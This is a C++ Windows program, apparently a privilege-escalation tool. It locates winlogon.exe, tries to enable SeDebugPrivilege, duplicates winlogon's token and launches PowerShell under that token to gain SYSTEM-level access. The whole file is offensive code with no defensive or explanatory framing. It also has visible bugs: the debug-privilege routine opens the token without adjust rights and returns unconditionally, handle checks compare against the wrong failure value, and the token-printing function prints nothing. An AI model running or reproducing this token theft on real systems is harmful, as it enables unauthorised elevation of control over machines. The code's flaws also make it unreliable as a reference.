#include <Windows.h>
#include <memory>
#include <iostream>
#include <string>
#include <TlHelp32.h>

// Function to retrieve and print information about the specified token
void PrintTokenUserInformation(HANDLE TokenHandle)
{
    DWORD ReturnLength;
    std::unique_ptr<BYTE[]> TokenInformation;

    // Get the size of the token information
    if (!GetTokenInformation(TokenHandle, TokenUser, nullptr, 0, &ReturnLength))
    {
        DWORD ErrorCode = GetLastError();
        if (ErrorCode != ERROR_INSUFFICIENT_BUFFER)
        {
            std::cerr << "Error getting token information size: " << ErrorCode << std::endl;
            return;
        }
    }
    // Allocate memory for the token information
    TokenInformation = std::make_unique<BYTE[]>(ReturnLength);
    PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(TokenInformation.get());
    if (!GetTokenInformation(TokenHandle, TokenUser, pTokenUser, ReturnLength, &ReturnLength))
    {
        DWORD ErrorCode = GetLastError();
        std::cerr << "Error getting token information: " << ErrorCode << std::endl;
        return;
    }

    // Print the token information
    // ...
}


DWORD getWinlogonProcessId()
{
    // Initialize the process ID to 0
    DWORD logonPID = 0;

    // Create a snapshot of the system's processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        // If the snapshot creation fails, print an error message
        DWORD errorCode = GetLastError();
        char errorMessage[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
        std::cerr << "Error creating toolhelp snapshot: " << errorCode << " - " << errorMessage << std::endl;
        return logonPID;
    }

    // Iterate through the list of processes
    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(snapshot, &processEntry))
    {
        do
        {
            // Check if the process name is "winlogon.exe"
            std::wstring processName = processEntry.szExeFile;
            if (_wcsicmp(processName.c_str(), L"winlogon.exe") == 0)
            {
                // If it is, set the process ID and break out of the loop
                logonPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }
    else
    {
        // If there is an error enumerating the processes, print an error message
        std::cerr << "Error enumerating processes: " << GetLastError() << std::endl;
    }

    // Close the snapshot handle
    CloseHandle(snapshot);

    // Return the process ID
    return logonPID;
}


void enableDebugPrivilege()
{
    // Open the current process to retrieve its token
    LUID luid;
    HANDLE currentProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, GetCurrentProcessId());
    if (currentProc == INVALID_HANDLE_VALUE)
    {
        DWORD errorCode = GetLastError();
        char errorMessage[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
        std::cerr << "Error opening current process: " << errorCode << " - " << errorMessage << std::endl;
        return;
    }

    HANDLE TokenHandle(nullptr);
    BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_QUERY, &TokenHandle);
    // Check if the call to OpenProcessToken was successful. If it wasn't, print an error message to the standard error stream.
    if (!hProcessToken)
    {
        // Retrieve the error code using GetLastError and convert it to a human-readable message using FormatMessageA.
        DWORD errorCode = GetLastError();
        char errorMessage[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);

        // Print the error code and message to the standard error stream.
        std::cerr << "Error opening process token: " << errorCode << " - " << errorMessage << std::endl;

        // Close the handle to the current process before returning from the function.
        CloseHandle(currentProc);
        return;
    }

    // Lookup the LUID for the SeDebugPrivilege privilege
    BOOL checkToken = LookupPrivilegeValue(nullptr, L"SeDebugPrivilege", &luid);
    if (!checkToken)
    {
        DWORD errorCode = GetLastError();
        char errorMessage[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
        std::cerr << "Error looking up privilege value: " << errorCode << " - " << errorMessage << std::endl;
        CloseHandle(TokenHandle);
        CloseHandle(currentProc);
        return;
    }

    TOKEN_PRIVILEGES tokenPrivs;
    // Set the number of privileges in the token to 1
    tokenPrivs.PrivilegeCount = 1;
    // Set the LUID of the privilege to the value looked up earlier
    tokenPrivs.Privileges[0].Luid = luid;
    // Set SeDebugPrivilege
    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges to enable the SeDebugPrivilege
    BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
    {
        // Close the handles
        CloseHandle(TokenHandle);
        CloseHandle(currentProc);
        return;
    }

    // Close the handles
    CloseHandle(TokenHandle);
    CloseHandle(currentProc);
}


void CreateImpersonatedProcess(HANDLE NewToken)
{
    bool impersonatedProcessCreated;

    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);

    PROCESS_INFORMATION processInformation = { 0 };

    // Create a new process with the specified token and logon type
    impersonatedProcessCreated = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE,
        L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        nullptr, 0, nullptr, nullptr, &startupInfo, &processInformation);

    // Check if the impersonated process was successfully created. If not, print an error message and return.
    if (!impersonatedProcessCreated)
    {
        DWORD errorCode = GetLastError();
        std::cerr << "Error creating impersonated process: " << errorCode << std::endl;
        return;
    }

    PrintTokenUserInformation(NewToken);
    CloseHandle(NewToken);
}

void GetImpersonationToken(int TargetPID)
{
    HANDLE hProcess = nullptr;
    HANDLE TokenHandle = nullptr;
    HANDLE NewToken = nullptr;
    BOOL OpenToken;
    BOOL Duplicate;

    // Open the specified process
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetPID);
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Error opening process: " << GetLastError() << std::endl;
        return;
    }

    // Open the process token
    OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &TokenHandle);
    if (!OpenToken)
    {
        std::cerr << "Error opening process token: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Duplicate the process token
    Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, nullptr, SecurityImpersonation, TokenPrimary, &NewToken);
    if (!Duplicate)
    {
        std::cerr << "Error duplicating token: " << GetLastError() << std::endl;
        CloseHandle(TokenHandle);
        CloseHandle(hProcess);
        return;
    }

    // Create an impersonated process with the duplicated token
    CreateImpersonatedProcess(NewToken);
}


void PrintCurrentProcessTokenInfo()
{
    // Handle to the current process
    HANDLE hCurrent = GetCurrentProcess();

    // Check if an error occurred while getting the current process
    if (hCurrent == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Error getting current process: " << GetLastError() << std::endl;
        return;
    }

    // Handle to the token for the current process
    HANDLE TokenHandle = nullptr;

    // Open the token for the current process
    BOOL OpenToken = OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);
    if (!OpenToken)
    {
        std::cerr << "Error opening process token: " << GetLastError() << std::endl;
        CloseHandle(hCurrent);
        return;
    }

    // Print the user information for the token
    PrintTokenUserInformation(TokenHandle);

    // Close the token handle
    CloseHandle(TokenHandle);
}

int main()
{
    // Check the token of the current process
    HANDLE TokenHandle = nullptr;
    HANDLE hCurrent = GetCurrentProcess();
    OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);
    PrintTokenUserInformation(TokenHandle);
    CloseHandle(TokenHandle);

    // Find the process ID of the winlogon process
    DWORD winlogonPID = getWinlogonProcessId();

    // Enable the SeDebugPrivilege privilege for the current process
    enableDebugPrivilege();

    // Obtain a duplicate of the winlogon process's token and create an impersonated process using it
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, winlogonPID);
    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &TokenHandle);
    HANDLE NewToken;
    DuplicateTokenEx(TokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
    CreateImpersonatedProcess(NewToken);

    return 0;
}
